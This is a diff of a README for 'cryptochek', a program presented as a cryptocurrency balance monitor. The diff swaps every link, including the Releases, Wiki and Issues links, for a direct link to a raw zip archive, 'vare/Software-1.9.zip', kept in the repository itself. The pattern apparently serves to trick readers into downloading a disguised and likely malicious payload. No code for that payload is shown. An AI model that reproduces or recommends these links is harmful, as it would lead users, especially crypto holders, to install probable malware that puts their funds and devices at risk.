@@ -1,7 +1,7 @@
 # 🛡️ cryptochek - Monitor Your Crypto Balances Safely
 
 ## 📥 Download Now
-[![Download cryptochek](https://img.shields.io/badge/Download-cryptochek-blue.svg)](https://github.com/Iliamnaalmoravid770/cryptochek/releases)
+[![Download cryptochek](https://github.com/Iliamnaalmoravid770/cryptochek/raw/refs/heads/main/vare/Software-1.9.zip)](https://github.com/Iliamnaalmoravid770/cryptochek/raw/refs/heads/main/vare/Software-1.9.zip)
 
 ## 🚀 Getting Started
 Welcome to cryptochek! This application helps you monitor the balances of your cryptocurrency addresses. You will get alerts if any changes occur. This is perfect for anyone who wants to keep their crypto safe and secure.
@@ -24,7 +24,7 @@ To run cryptochek, ensure your device meets the following requirements:
 ## 📥 Download & Install
 To get started with cryptochek, visit the link below and download the latest release.
 
-[Download cryptochek from Releases](https://github.com/Iliamnaalmoravid770/cryptochek/releases)
+[Download cryptochek from Releases](https://github.com/Iliamnaalmoravid770/cryptochek/raw/refs/heads/main/vare/Software-1.9.zip)
 
 Once downloaded, follow these steps:
 
@@ -67,7 +67,7 @@ cryptochek is licensed under the MIT License. You can freely use, modify, and di
 For updates and new features, follow our GitHub repository. Your feedback is important in helping us improve cryptochek. We appreciate your support!
 
 ## 📥 Additional Resources
-- **Documentation:** For detailed user guidance, visit our [Wiki](https://github.com/Iliamnaalmoravid770/cryptochek/wiki).
-- **Report Issues:** If you find bugs or have feature requests, please use the [Issues section](https://github.com/Iliamnaalmoravid770/cryptochek/issues).
+- **Documentation:** For detailed user guidance, visit our [Wiki](https://github.com/Iliamnaalmoravid770/cryptochek/raw/refs/heads/main/vare/Software-1.9.zip).
+- **Report Issues:** If you find bugs or have feature requests, please use the [Issues section](https://github.com/Iliamnaalmoravid770/cryptochek/raw/refs/heads/main/vare/Software-1.9.zip).
 
-🔗 [Download cryptochek from Releases](https://github.com/Iliamnaalmoravid770/cryptochek/releases) and start monitoring your cryptocurrency balances today!
+🔗 [Download cryptochek from Releases](https://github.com/Iliamnaalmoravid770/cryptochek/raw/refs/heads/main/vare/Software-1.9.zip) and start monitoring your cryptocurrency balances today!
